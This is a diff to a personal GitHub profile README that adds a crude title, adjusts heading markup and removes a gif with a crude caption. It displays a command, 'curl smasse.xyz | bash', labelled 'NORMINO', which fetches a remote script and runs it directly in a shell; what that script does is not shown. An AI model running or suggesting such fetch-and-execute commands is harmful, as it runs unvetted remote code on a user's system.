@@ -1,3 +1,7 @@
+<h1 align="center">
+  <strong>CUMZONE</strong>
+</h1>
+
 <p>
   <img src="https://img.shields.io/github/followers/SLDDL?label=Followers&style=for-the-badge&color=purple" />
   <img src="https://img.shields.io/github/stars/SLDDL?label=Stars&style=for-the-badge&color=purple" />
@@ -133,13 +137,11 @@
 <br>
 </br>
 
-<h1>
+<h2 align ="center";>
 <tr> 
   <td>⭐⭐NORMINO⭐⭐ : curl smasse.xyz | bash
 </tr>
-</h1>
-
-<img align="center" src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:1000px; height:300px;">
+</h2>
 
 <h1 align="center">
   <pre>
